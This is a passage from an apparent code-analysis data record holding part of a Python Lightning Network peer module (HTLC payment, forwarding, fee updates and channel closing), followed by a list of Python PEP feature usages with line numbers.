error_bytes=reason)  \n        self.maybe_send_commitment(chan)\n    def maybe_send_commitment(self, chan: Channel):\n        if chan.hm.is_revack_pending(REMOTE):\n            return\n        if not chan.has_pending_changes(REMOTE):\n            return\n        self.logger.info(f'send_commitment. chan {chan.short_channel_id}. ctn: {chan.get_next_ctn(REMOTE)}.')\n        sig_64, htlc_sigs = chan.sign_next_commitment()\n        self.send_message(\"commitment_signed\", channel_id=chan.channel_id, signature=sig_64, num_htlcs=len(htlc_sigs), htlc_signature=b\"\".join(htlc_sigs))\n    def pay(self, *, route: 'LNPaymentRoute', chan: Channel, amount_msat: int,\n            payment_hash: bytes, min_final_cltv_expiry: int, payment_secret: bytes = None) -> UpdateAddHtlc:\n        assert amount_msat > 0, \"amount_msat is not greater zero\"\n        assert len(route) > 0\n        if not chan.can_send_update_add_htlc():\n            raise PaymentFailure(\"Channel cannot send update_add_htlc\")\n        route[0].node_features |= self.features\n        local_height = self.network.get_local_height()\n        final_cltv = local_height + min_final_cltv_expiry\n        hops_data, amount_msat, cltv = calc_hops_data_for_payment(route, amount_msat, final_cltv,\n                                                                  payment_secret=payment_secret)\n        assert final_cltv <= cltv, (final_cltv, cltv)\n        secret_key = os.urandom(32)\n        onion = new_onion_packet([x.node_id for x in route], secret_key, hops_data, associated_data=payment_hash)\n        if cltv > local_height + lnutil.NBLOCK_CLTV_EXPIRY_TOO_FAR_INTO_FUTURE:\n            raise PaymentFailure(f\"htlc expiry too far into future. (in {cltv-local_height} blocks)\")\n        htlc = UpdateAddHtlc(amount_msat=amount_msat, payment_hash=payment_hash, cltv_expiry=cltv, timestamp=int(time.time()))\n        htlc = chan.add_htlc(htlc)\n        chan.set_onion_key(htlc.htlc_id, secret_key)\n        self.logger.info(f\"starting payment. len(route)={len(route)}. route: {route}. \"\n                         f\"htlc: {htlc}. hops_data={hops_data!r}\")\n        self.send_message(\n            \"update_add_htlc\",\n            channel_id=chan.channel_id,\n            id=htlc.htlc_id,\n            cltv_expiry=htlc.cltv_expiry,\n            amount_msat=htlc.amount_msat,\n            payment_hash=htlc.payment_hash,\n            onion_routing_packet=onion.to_bytes())\n        self.maybe_send_commitment(chan)\n        return htlc\n    def send_revoke_and_ack(self, chan: Channel):\n        self.logger.info(f'send_revoke_and_ack. chan {chan.short_channel_id}. ctn: {chan.get_oldest_unrevoked_ctn(LOCAL)}')\n        rev = chan.revoke_current_commitment()\n        self.lnworker.save_channel(chan)\n        self.send_message(\"revoke_and_ack\",\n            channel_id=chan.channel_id,\n            per_commitment_secret=rev.per_commitment_secret,\n            next_per_commitment_point=rev.next_per_commitment_point)\n        self.maybe_send_commitment(chan)\n    def on_commitment_signed(self, chan: Channel, payload):\n        if chan.peer_state == PeerState.BAD:\n            return\n        self.logger.info(f'on_commitment_signed. chan {chan.short_channel_id}. ctn: {chan.get_next_ctn(LOCAL)}.')\n        if not chan.has_pending_changes(LOCAL):\n            raise RemoteMisbehaving('received commitment_signed without pending changes')\n        if chan.hm.is_revack_pending(LOCAL):\n            raise RemoteMisbehaving('received commitment_signed before we revoked previous ctx')\n        data = payload[\"htlc_signature\"]\n        htlc_sigs = list(chunks(data, 64))\n        chan.receive_new_commitment(payload[\"signature\"], htlc_sigs)\n        self.send_revoke_and_ack(chan)\n    def on_update_fulfill_htlc(self, chan: Channel, payload):\n        preimage = payload[\"payment_preimage\"]\n        payment_hash = sha256(preimage)\n        htlc_id = payload[\"id\"]\n        self.logger.info(f\"on_update_fulfill_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")\n        chan.receive_htlc_settle(preimage, htlc_id)  \n        self.lnworker.save_preimage(payment_hash, preimage)\n        self.maybe_send_commitment(chan)\n    def on_update_fail_malformed_htlc(self, chan: Channel, payload):\n        htlc_id = payload[\"id\"]\n        failure_code = payload[\"failure_code\"]\n        self.logger.info(f\"on_update_fail_malformed_htlc. chan {chan.get_id_for_log()}. \"\n                         f\"htlc_id {htlc_id}. failure_code={failure_code}\")\n        if failure_code & OnionFailureCodeMetaFlag.BADONION == 0:\n            asyncio.ensure_future(self.lnworker.try_force_closing(chan.channel_id))\n            raise RemoteMisbehaving(f\"received update_fail_malformed_htlc with unexpected failure code: {failure_code}\")\n        reason = OnionRoutingFailureMessage(code=failure_code, data=payload[\"sha256_of_onion\"])\n        chan.receive_fail_htlc(htlc_id, error_bytes=None, reason=reason)\n        self.maybe_send_commitment(chan)\n    def on_update_add_htlc(self, chan: Channel, payload):\n        payment_hash = payload[\"payment_hash\"]\n        htlc_id = payload[\"id\"]\n        self.logger.info(f\"on_update_add_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")\n        cltv_expiry = payload[\"cltv_expiry\"]\n        amount_msat_htlc = payload[\"amount_msat\"]\n        onion_packet = payload[\"onion_routing_packet\"]\n        if chan.get_state() != ChannelState.OPEN:\n            raise RemoteMisbehaving(f\"received update_add_htlc while chan.get_state() != OPEN. state was {chan.get_state()!r}\")\n        if cltv_expiry > bitcoin.NLOCKTIME_BLOCKHEIGHT_MAX:\n            asyncio.ensure_future(self.lnworker.try_force_closing(chan.channel_id))\n            raise RemoteMisbehaving(f\"received update_add_htlc with cltv_expiry > BLOCKHEIGHT_MAX. value was {cltv_expiry}\")\n        htlc = UpdateAddHtlc(\n            amount_msat=amount_msat_htlc,\n            payment_hash=payment_hash,\n            cltv_expiry=cltv_expiry,\n            timestamp=int(time.time()),\n            htlc_id=htlc_id)\n        chan.receive_htlc(htlc, onion_packet)\n        util.trigger_callback('htlc_added', chan, htlc, RECEIVED)\n    def maybe_forward_htlc(self, chan: Channel, htlc: UpdateAddHtlc, *,\n                           onion_packet: OnionPacket, processed_onion: ProcessedOnionPacket\n                           ) -> Tuple[Optional[bytes], Optional[int], Optional[OnionRoutingFailureMessage]]:\n        forwarding_enabled = self.network.config.get('lightning_forward_payments', False)\n        if not forwarding_enabled:\n            self.logger.info(f\"forwarding is disabled. failing htlc.\")\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.PERMANENT_CHANNEL_FAILURE, data=b'')\n        chain = self.network.blockchain()\n        if chain.is_tip_stale():\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.TEMPORARY_NODE_FAILURE, data=b'')\n        try:\n            next_chan_scid = processed_onion.hop_data.payload[\"short_channel_id\"][\"short_channel_id\"]\n        except:\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_PAYLOAD, data=b'\\x00\\x00\\x00')\n        next_chan = self.lnworker.get_channel_by_short_id(next_chan_scid)\n        local_height = chain.height()\n        if next_chan is None:\n            self.logger.info(f\"cannot forward htlc. cannot find next_chan {next_chan_scid}\")\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.UNKNOWN_NEXT_PEER, data=b'')\n        outgoing_chan_upd = next_chan.get_outgoing_gossip_channel_update()[2:]\n        outgoing_chan_upd_len = len(outgoing_chan_upd).to_bytes(2, byteorder=\"big\")\n        if not next_chan.can_send_update_add_htlc():\n            self.logger.info(f\"cannot forward htlc. next_chan {next_chan_scid} cannot send ctx updates. \"\n                             f\"chan state {next_chan.get_state()!r}, peer state: {next_chan.peer_state!r}\")\n            data = outgoing_chan_upd_len + outgoing_chan_upd\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.TEMPORARY_CHANNEL_FAILURE, data=data)\n        try:\n            next_cltv_expiry = processed_onion.hop_data.payload[\"outgoing_cltv_value\"][\"outgoing_cltv_value\"]\n        except:\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_PAYLOAD, data=b'\\x00\\x00\\x00')\n        if htlc.cltv_expiry - next_cltv_expiry < NBLOCK_OUR_CLTV_EXPIRY_DELTA:\n            data = htlc.cltv_expiry.to_bytes(4, byteorder=\"big\") + outgoing_chan_upd_len + outgoing_chan_upd\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.INCORRECT_CLTV_EXPIRY, data=data)\n        if htlc.cltv_expiry - lnutil.MIN_FINAL_CLTV_EXPIRY_ACCEPTED <= local_height \\\n                or next_cltv_expiry <= local_height:\n            data = outgoing_chan_upd_len + outgoing_chan_upd\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.EXPIRY_TOO_SOON, data=data)\n        if max(htlc.cltv_expiry, next_cltv_expiry) > local_height + lnutil.NBLOCK_CLTV_EXPIRY_TOO_FAR_INTO_FUTURE:\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.EXPIRY_TOO_FAR, data=b'')\n        try:\n            next_amount_msat_htlc = processed_onion.hop_data.payload[\"amt_to_forward\"][\"amt_to_forward\"]\n        except:\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_PAYLOAD, data=b'\\x00\\x00\\x00')\n        forwarding_fees = fee_for_edge_msat(\n            forwarded_amount_msat=next_amount_msat_htlc,\n            fee_base_msat=lnutil.OUR_FEE_BASE_MSAT,\n            fee_proportional_millionths=lnutil.OUR_FEE_PROPORTIONAL_MILLIONTHS)\n        if htlc.amount_msat - next_amount_msat_htlc < forwarding_fees:\n            data = next_amount_msat_htlc.to_bytes(8, byteorder=\"big\") + outgoing_chan_upd_len + outgoing_chan_upd\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.FEE_INSUFFICIENT, data=data)\n        self.logger.info(f'forwarding htlc to {next_chan.node_id}')\n        next_htlc = UpdateAddHtlc(\n            amount_msat=next_amount_msat_htlc,\n            payment_hash=htlc.payment_hash,\n            cltv_expiry=next_cltv_expiry,\n            timestamp=int(time.time()))\n        next_htlc = next_chan.add_htlc(next_htlc)\n        next_peer = self.lnworker.peers[next_chan.node_id]\n        try:\n            next_peer.send_message(\n                \"update_add_htlc\",\n                channel_id=next_chan.channel_id,\n                id=next_htlc.htlc_id,\n                cltv_expiry=next_cltv_expiry,\n                amount_msat=next_amount_msat_htlc,\n                payment_hash=next_htlc.payment_hash,\n                onion_routing_packet=processed_onion.next_packet.to_bytes()\n            )\n        except BaseException as e:\n            self.logger.info(f\"failed to forward htlc: error sending message. {e}\")\n            data = outgoing_chan_upd_len + outgoing_chan_upd\n            return None, None, OnionRoutingFailureMessage(code=OnionFailureCode.TEMPORARY_CHANNEL_FAILURE, data=data)\n        return next_chan_scid, next_htlc.htlc_id, None\n    def maybe_fulfill_htlc(self, *, chan: Channel, htlc: UpdateAddHtlc,\n                           onion_packet: OnionPacket, processed_onion: ProcessedOnionPacket,\n                           ) -> Tuple[Optional[bytes], Optional[OnionRoutingFailureMessage]]:\n        info = self.lnworker.get_payment_info(htlc.payment_hash)\n        if info is None:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.INCORRECT_OR_UNKNOWN_PAYMENT_DETAILS, data=b'')\n            return None, reason\n        preimage = self.lnworker.get_preimage(htlc.payment_hash)\n        try:\n            payment_secret_from_onion = processed_onion.hop_data.payload[\"payment_data\"][\"payment_secret\"]\n        except:\n            pass  \n        else:\n            if payment_secret_from_onion != derive_payment_secret_from_payment_preimage(preimage):\n                reason = OnionRoutingFailureMessage(code=OnionFailureCode.INCORRECT_OR_UNKNOWN_PAYMENT_DETAILS, data=b'')\n                return None, reason\n        expected_received_msat = int(info.amount * 1000) if info.amount is not None else None\n        if expected_received_msat is not None and \\\n                not (expected_received_msat <= htlc.amount_msat <= 2 * expected_received_msat):\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.INCORRECT_OR_UNKNOWN_PAYMENT_DETAILS, data=b'')\n            return None, reason\n        chain = self.network.blockchain()\n        if chain.is_tip_stale():\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.TEMPORARY_NODE_FAILURE, data=b'')\n            return None, reason\n        local_height = chain.height()\n        if local_height + MIN_FINAL_CLTV_EXPIRY_ACCEPTED > htlc.cltv_expiry:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.FINAL_EXPIRY_TOO_SOON, data=b'')\n            return None, reason\n        try:\n            cltv_from_onion = processed_onion.hop_data.payload[\"outgoing_cltv_value\"][\"outgoing_cltv_value\"]\n        except:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_PAYLOAD, data=b'\\x00\\x00\\x00')\n            return None, reason\n        if cltv_from_onion != htlc.cltv_expiry:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.FINAL_INCORRECT_CLTV_EXPIRY,\n                                                data=htlc.cltv_expiry.to_bytes(4, byteorder=\"big\"))\n            return None, reason\n        try:\n            amount_from_onion = processed_onion.hop_data.payload[\"amt_to_forward\"][\"amt_to_forward\"]\n        except:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_PAYLOAD, data=b'\\x00\\x00\\x00')\n            return None, reason\n        try:\n            amount_from_onion = processed_onion.hop_data.payload[\"payment_data\"][\"total_msat\"]\n        except:\n            pass  \n        if amount_from_onion > htlc.amount_msat:\n            reason = OnionRoutingFailureMessage(code=OnionFailureCode.FINAL_INCORRECT_HTLC_AMOUNT,\n                                                data=htlc.amount_msat.to_bytes(8, byteorder=\"big\"))\n            return None, reason\n        return preimage, None\n    def fulfill_htlc(self, chan: Channel, htlc_id: int, preimage: bytes):\n        self.logger.info(f\"_fulfill_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")\n        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\"\n        chan.settle_htlc(preimage, htlc_id)\n        self.send_message(\"update_fulfill_htlc\",\n                          channel_id=chan.channel_id,\n                          id=htlc_id,\n                          payment_preimage=preimage)\n    def fail_htlc(self, *, chan: Channel, htlc_id: int, error_bytes: bytes):\n        self.logger.info(f\"fail_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}.\")\n        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\"\n        chan.fail_htlc(htlc_id)\n        self.send_message(\n            \"update_fail_htlc\",\n            channel_id=chan.channel_id,\n            id=htlc_id,\n            len=len(error_bytes),\n            reason=error_bytes)\n    def fail_malformed_htlc(self, *, chan: Channel, htlc_id: int, reason: OnionRoutingFailureMessage):\n        self.logger.info(f\"fail_malformed_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}.\")\n        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\"\n        chan.fail_htlc(htlc_id)\n        if not (reason.code & OnionFailureCodeMetaFlag.BADONION and len(reason.data) == 32):\n            raise Exception(f\"unexpected reason when sending 'update_fail_malformed_htlc': {reason!r}\")\n        self.send_message(\n            \"update_fail_malformed_htlc\",\n            channel_id=chan.channel_id,\n            id=htlc_id,\n            sha256_of_onion=reason.data,\n            failure_code=reason.code)\n    def on_revoke_and_ack(self, chan: Channel, payload):\n        if chan.peer_state == PeerState.BAD:\n            return\n        self.logger.info(f'on_revoke_and_ack. chan {chan.short_channel_id}. ctn: {chan.get_oldest_unrevoked_ctn(REMOTE)}')\n        rev = RevokeAndAck(payload[\"per_commitment_secret\"], payload[\"next_per_commitment_point\"])\n        chan.receive_revocation(rev)\n        self.lnworker.save_channel(chan)\n        self.maybe_send_commitment(chan)\n    def on_update_fee(self, chan: Channel, payload):\n        feerate = payload[\"feerate_per_kw\"]\n        chan.update_fee(feerate, False)\n    async def maybe_update_fee(self, chan: Channel):\n        if not chan.can_send_ctx_updates():\n            return\n        feerate_per_kw = self.lnworker.current_feerate_per_kw()\n        if not chan.constraints.is_initiator:\n            if constants.net is not constants.BitcoinRegtest:\n                chan_feerate = chan.get_latest_feerate(LOCAL)\n                ratio = chan_feerate / feerate_per_kw\n                if ratio < 0.5:\n                    self.logger.warning(\n                        f\"({chan.get_id_for_log()}) feerate is {chan_feerate} sat/kw, \"\n                        f\"current recommended feerate is {feerate_per_kw} sat/kw, consider force closing!\")\n            return\n        chan_fee = chan.get_next_feerate(REMOTE)\n        if feerate_per_kw < chan_fee / 2:\n            self.logger.info(\"FEES HAVE FALLEN\")\n        elif feerate_per_kw > chan_fee * 2:\n            self.logger.info(\"FEES HAVE RISEN\")\n        else:\n            return\n        self.logger.info(f\"(chan: {chan.get_id_for_log()}) current pending feerate {chan_fee}. \"\n                         f\"new feerate {feerate_per_kw}\")\n        chan.update_fee(feerate_per_kw, True)\n        self.send_message(\n            \"update_fee\",\n            channel_id=chan.channel_id,\n            feerate_per_kw=feerate_per_kw)\n        self.maybe_send_commitment(chan)\n    @log_exceptions\n    async def close_channel(self, chan_id: bytes):\n        chan = self.channels[chan_id]\n        self.shutdown_received[chan_id] = asyncio.Future()\n        await self.send_shutdown(chan)\n        payload = await self.shutdown_received[chan_id]\n        txid = await self._shutdown(chan, payload, True)\n        self.logger.info(f'({chan.get_id_for_log()}) Channel closed {txid}')\n        return txid\n    @log_exceptions\n    async def on_shutdown(self, chan: Channel, payload):\n        their_scriptpubkey = payload['scriptpubkey']\n        if not (match_script_against_template(their_scriptpubkey, transaction.SCRIPTPUBKEY_TEMPLATE_WITNESS_V0)\n                or match_script_against_template(their_scriptpubkey, transaction.SCRIPTPUBKEY_TEMPLATE_P2SH)\n                or match_script_against_template(their_scriptpubkey, transaction.SCRIPTPUBKEY_TEMPLATE_P2PKH)):\n            raise Exception(f'scriptpubkey in received shutdown message does not conform to any template: {their_scriptpubkey.hex()}')\n        chan_id = chan.channel_id\n        if chan_id in self.shutdown_received:\n            self.shutdown_received[chan_id].set_result(payload)\n        else:\n            chan = self.channels[chan_id]\n            await self.send_shutdown(chan)\n            txid = await self._shutdown(chan, payload, False)\n            self.logger.info(f'({chan.get_id_for_log()}) Channel closed by remote peer {txid}')\n    def can_send_shutdown(self, chan):\n        if chan.get_state() >= ChannelState.OPENING:\n            return True\n        if chan.constraints.is_initiator and chan.channel_id in self.funding_created_sent:\n            return True\n        if not chan.constraints.is_initiator and chan.channel_id in self.funding_signed_sent:\n            return True\n        return False\n    async def send_shutdown(self, chan: Channel):\n        if not self.can_send_shutdown(chan):\n            raise Exception('cannot send shutdown')\n        scriptpubkey = bfh(bitcoin.address_to_script(chan.sweep_address))\n        chan.set_can_send_ctx_updates(False)\n        while chan.has_pending_changes(REMOTE):\n            await asyncio.sleep(0.1)\n        self.send_message('shutdown', channel_id=chan.channel_id, len=len(scriptpubkey), scriptpubkey=scriptpubkey)\n        chan.set_state(ChannelState.SHUTDOWN)\n        chan.set_can_send_ctx_updates(True)\n    @log_exceptions\n    async def _shutdown(self, chan: Channel, payload, is_local):\n        while len(chan.hm.htlcs(LOCAL)) + len(chan.hm.htlcs(REMOTE)) > 0:\n            self.logger.info(f'(chan: {chan.short_channel_id}) waiting for htlcs to settle...')\n            await asyncio.sleep(1)\n        chan.set_can_send_ctx_updates(False)\n        their_scriptpubkey = payload['scriptpubkey']\n        our_scriptpubkey = bfh(bitcoin.address_to_script(chan.sweep_address))\n        our_sig, closing_tx = chan.make_closing_tx(our_scriptpubkey, their_scriptpubkey, fee_sat=0)\n        fee_rate = self.network.config.fee_per_kb()\n        our_fee = fee_rate * closing_tx.estimated_size() // 1000\n        max_fee = chan.get_latest_fee(LOCAL if is_local else REMOTE)\n        our_fee = min(our_fee, max_fee)\n        drop_remote = False\n        def send_closing_signed():\n            our_sig, closing_tx = chan.make_closing_tx(our_scriptpubkey, their_scriptpubkey, fee_sat=our_fee, drop_remote=drop_remote)\n            self.send_message('closing_signed', channel_id=chan.channel_id, fee_satoshis=our_fee, signature=our_sig)\n        def verify_signature(tx, sig):\n            their_pubkey = chan.config[REMOTE].multisig_key.pubkey\n            preimage_hex = tx.serialize_preimage(0)\n            pre_hash = sha256d(bfh(preimage_hex))\n            return ecc.verify_signature(their_pubkey, sig, pre_hash)\n        if chan.constraints.is_initiator:\n            send_closing_signed()\n        while True:\n            cs_payload = await self.wait_for_message('closing_signed', chan.channel_id)\n            their_fee = cs_payload['fee_satoshis']\n            if their_fee > max_fee:\n                raise Exception(f'the proposed fee exceeds the base fee of the latest commitment transaction {is_local, their_fee, max_fee}')\n            their_sig = cs_payload['signature']\n            our_sig, closing_tx = chan.make_closing_tx(our_scriptpubkey, their_scriptpubkey, fee_sat=their_fee, drop_remote=False)\n            if verify_signature(closing_tx, their_sig):\n                drop_remote = False\n            else:\n                our_sig, closing_tx = chan.make_closing_tx(our_scriptpubkey, their_scriptpubkey, fee_sat=their_fee, drop_remote=True)\n                if verify_signature(closing_tx, their_sig):\n                    drop_remote = True\n                else:\n                    raise Exception('failed to verify their signature')\n            if abs(our_fee - their_fee) < 2:\n                our_fee = their_fee\n                break\n            our_fee = (our_fee + their_fee) // 2\n            send_closing_signed()\n        if not chan.constraints.is_initiator:\n            send_closing_signed()\n        closing_tx.add_signature_to_txin(\n            txin_idx=0,\n            signing_pubkey=chan.config[LOCAL].multisig_key.pubkey.hex(),\n            sig=bh2u(der_sig_from_sig_string(our_sig) + b'\\x01'))\n        closing_tx.add_signature_to_txin(\n            txin_idx=0,\n            signing_pubkey=chan.config[REMOTE].multisig_key.pubkey.hex(),\n            sig=bh2u(der_sig_from_sig_string(their_sig) + b'\\x01'))\n        try:\n            self.lnworker.wallet.add_transaction(closing_tx)\n        except UnrelatedTransactionException:\n            pass  \n        chan.set_state(ChannelState.CLOSING)\n        await self.network.try_broadcasting(closing_tx, 'closing')\n        return closing_tx.txid()\n    async def htlc_switch(self):\n        await self.initialized\n        while True:\n            await asyncio.sleep(0.1)\n            self.ping_if_required()\n            for chan_id, chan in self.channels.items():\n                if not chan.can_send_ctx_updates():\n                    continue\n                self.maybe_send_commitment(chan)\n                done = set()\n                unfulfilled = chan.hm.log.get('unfulfilled_htlcs', {})\n                for htlc_id, (local_ctn, remote_ctn, onion_packet_hex, forwarding_info) in unfulfilled.items():\n                    if chan.get_oldest_unrevoked_ctn(LOCAL) <= local_ctn:\n                        continue\n                    if chan.get_oldest_unrevoked_ctn(REMOTE) <= remote_ctn:\n                        continue\n                    chan.logger.info(f'found unfulfilled htlc: {htlc_id}')\n                    htlc = chan.hm.get_htlc_by_id(REMOTE, htlc_id)\n                    payment_hash = htlc.payment_hash\n                    error_reason = None  \n                    error_bytes = None  \n                    preimage = None\n                    onion_packet_bytes = bytes.fromhex(onion_packet_hex)\n                    onion_packet = None\n                    try:\n                        onion_packet = OnionPacket.from_bytes(onion_packet_bytes)\n                        processed_onion = process_onion_packet(onion_packet, associated_data=payment_hash, our_onion_private_key=self.privkey)\n                    except UnsupportedOnionPacketVersion:\n                        error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_VERSION, data=sha256(onion_packet_bytes))\n                    except InvalidOnionPubkey:\n                        error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_KEY, data=sha256(onion_packet_bytes))\n                    except InvalidOnionMac:\n                        error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_HMAC, data=sha256(onion_packet_bytes))\n                    except Exception as e:\n                        self.logger.info(f\"error processing onion packet: {e!r}\")\n                        error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_VERSION, data=sha256(onion_packet_bytes))\n                    else:\n                        if self.network.config.get('test_fail_malformed_htlc'):\n                            error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.INVALID_ONION_VERSION, data=sha256(onion_packet_bytes))\n                        if self.network.config.get('test_fail_htlcs_with_temp_node_failure'):\n                            error_reason = OnionRoutingFailureMessage(code=OnionFailureCode.TEMPORARY_NODE_FAILURE, data=b'')\n                    if not error_reason:\n                        if processed_onion.are_we_final:\n                            preimage, error_reason = self.maybe_fulfill_htlc(\n                                chan=chan,\n                                htlc=htlc,\n                                onion_packet=onion_packet,\n                                processed_onion=processed_onion)\n                        elif not forwarding_info:\n                            next_chan_id, next_htlc_id, error_reason = self.maybe_forward_htlc(\n                                chan=chan,\n                                htlc=htlc,\n                                onion_packet=onion_packet,\n                                processed_onion=processed_onion)\n                            if next_chan_id:\n                                fw_info = (next_chan_id.hex(), next_htlc_id)\n                                unfulfilled[htlc_id] = local_ctn, remote_ctn, onion_packet_hex, fw_info\n                        else:\n                            preimage = self.lnworker.get_preimage(payment_hash)\n                            next_chan_id_hex, htlc_id = forwarding_info\n                            next_chan = self.lnworker.get_channel_by_short_id(bytes.fromhex(next_chan_id_hex))\n                            if next_chan:\n                                error_bytes, error_reason = next_chan.pop_fail_htlc_reason(htlc_id)\n                        if preimage:\n                            await self.lnworker.enable_htlc_settle.wait()\n                            self.fulfill_htlc(chan, htlc.htlc_id, preimage)\n                            done.add(htlc_id)\n                    if error_reason or error_bytes:\n                        if onion_packet and error_reason:\n                            error_bytes = construct_onion_error(error_reason, onion_packet, our_onion_private_key=self.privkey)\n                        if error_bytes:\n                            self.fail_htlc(\n                                chan=chan,\n                                htlc_id=htlc.htlc_id,\n                                error_bytes=error_bytes)\n                        else:\n                            self.fail_malformed_htlc(\n                                chan=chan,\n                                htlc_id=htlc.htlc_id,\n                                reason=error_reason)\n                        done.add(htlc_id)\n                for htlc_id in done:\n                    unfulfilled.pop(htlc_id)",
            "patterns": {
                "pep_468": [
                    [
                        92,
                        "encode_msg(message_name, **kwargs)"
                    ],
                    [
                        228,
                        "func(self, *args, **kwargs)"
                    ],
                    [
                        449,
                        "func(self, *args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        459,
                        "            funding_tx: 'PartialTransaction',",
                        "quoted annotation"
                    ],
                    [
                        917,
                        "    def pay(self, *, route: 'LNPaymentRoute', chan: Channel, amount_msat: int,",
                        "quoted annotation"
                    ],
                    [
                        441,
                        "        async def wrapper(self: 'Peer', *args, **kwargs):",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        8,
                        "from typing import List, Tuple, Dict, TYPE_CHECKING, Optional, Callable, Union",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import List, Tuple, Dict, TYPE_CHECKING, Optional, Callable, Union",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import List, Tuple, Dict, TYPE_CHECKING, Optional, Callable, Union",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        127,
                        "    def channels(self) -> Dict[bytes, Channel]:",
                        "violation"
                    ],
                    [
                        1008,
                        "    def maybe_forward_htlc(self, chan: Channel, htlc: UpdateAddHtlc, *,",
                        "violation"
                    ],
                    [
                        1081,
                        "    def maybe_fulfill_htlc(self, *, chan: Channel, htlc: UpdateAddHtlc,",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        399,
                        401,
                        "async for",
                        "async for msg in self.transport.read_messages():\n            self.process_message(msg)\n            await asyncio.sleep(.01)"
                    ]
                ],
                "pep_498v": [
                    [
                        312,
                        312,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        1135,
                        "        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\""
                    ],
                    [
                        1143,
                        "        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\""
                    ],
                    [
                        1153,
                        "        assert chan.can_send_ctx_updates(), f\"cannot send updates: {chan.short_channel_id}\""
                    ],
                    [
                        89,
                        "        self.logger.debug(f\"Sending {message_name.upper()}\")"
                    ],
                    [
                        168,
                        "        self.logger.info(f\"remote peer sent error [DO NOT TRUST THIS MESSAGE]: {payload['data'].decode('ascii')}\")"
                    ],
                    [
                        356,
                        "        self.logger.info(f'query channel range {first_block} {num_blocks}')"
                    ],
                    [
                        379,
                        "        self.logger.info(f'Querying {len(ids)} short_channel_ids')"
                    ],
                    [
                        710,
                        "        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): sent channel_reestablish with '"
                    ],
                    [
                        724,
                        "        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): received channel_reestablish with '"
                    ],
                    [
                        739,
                        "        self.logger.info(f'channel_reestablish ({chan.get_id_for_log()}): replayed {n_replayed_msgs} unacked messages')"
                    ],
                    [
                        822,
                        "        self.logger.info(f\"on_funding_locked. channel: {bh2u(chan.channel_id)}\")"
                    ],
                    [
                        884,
                        "        self.logger.info(f\"CHANNEL OPENING COMPLETED ({chan.get_id_for_log()})\")"
                    ],
                    [
                        906,
                        "        self.logger.info(f\"on_update_fail_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")"
                    ],
                    [
                        914,
                        "        self.logger.info(f'send_commitment. chan {chan.short_channel_id}. ctn: {chan.get_next_ctn(REMOTE)}.')"
                    ],
                    [
                        936,
                        "        self.logger.info(f\"starting payment. len(route)={len(route)}. route: {route}. \""
                    ],
                    [
                        949,
                        "        self.logger.info(f'send_revoke_and_ack. chan {chan.short_channel_id}. ctn: {chan.get_oldest_unrevoked_ctn(LOCAL)}')"
                    ],
                    [
                        960,
                        "        self.logger.info(f'on_commitment_signed. chan {chan.short_channel_id}. ctn: {chan.get_next_ctn(LOCAL)}.')"
                    ],
                    [
                        973,
                        "        self.logger.info(f\"on_update_fulfill_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")"
                    ],
                    [
                        980,
                        "        self.logger.info(f\"on_update_fail_malformed_htlc. chan {chan.get_id_for_log()}. \""
                    ],
                    [
                        991,
                        "        self.logger.info(f\"on_update_add_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")"
                    ],
                    [
                        1058,
                        "        self.logger.info(f'forwarding htlc to {next_chan.node_id}')"
                    ],
                    [
                        1134,
                        "        self.logger.info(f\"_fulfill_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}\")"
                    ],
                    [
                        1142,
                        "        self.logger.info(f\"fail_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}.\")"
                    ],
                    [
                        1152,
                        "        self.logger.info(f\"fail_malformed_htlc. chan {chan.short_channel_id}. htlc_id {htlc_id}.\")"
                    ],
                    [
                        1166,
